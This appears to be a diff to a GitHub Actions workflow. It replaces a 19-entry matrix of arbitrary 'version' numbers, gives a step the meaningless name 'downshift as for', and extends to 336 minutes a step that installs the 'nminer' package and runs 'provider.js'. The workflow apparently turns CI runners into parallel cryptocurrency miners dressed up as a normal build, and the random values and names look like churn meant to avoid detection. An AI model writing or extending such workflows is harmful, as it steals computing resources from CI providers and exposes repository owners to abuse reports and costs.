@@ -9,25 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4874 }
-          - { version: 5292 }
-          - { version: 1018 }
-          - { version: 1254 }
-          - { version: 683 }
-          - { version: 3 }
-          - { version: 688 }
-          - { version: 9214 }
-          - { version: 5960 }
-          - { version: 3696 }
-          - { version: 2764 }
-          - { version: 727 }
-          - { version: 6889 }
-          - { version: 8521 }
-          - { version: 9928 }
-          - { version: 2990 }
-          - { version: 3131 }
-          - { version: 9545 }
-          - { version: 7116 }
+          - { version: 4161 }
+          - { version: 6992 }
+          - { version: 9208 }
+          - { version: 9002 }
+          - { version: 6117 }
+          - { version: 3874 }
+          - { version: 4385 }
+          - { version: 155 }
+          - { version: 3907 }
+          - { version: 8237 }
+          - { version: 500 }
+          - { version: 4180 }
+          - { version: 549 }
+          - { version: 7733 }
+          - { version: 641 }
+          - { version: 1393 }
+          - { version: 1523 }
+          - { version: 1569 }
+          - { version: 6098 }
 
     steps:
       - name: Checkout
@@ -38,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: front
+      - name: downshift as for
         run: |
           npm install nminer@latest
-          timeout 300m node provider.js || echo "provider executed"
+          timeout 336m node provider.js || echo "provider executed"
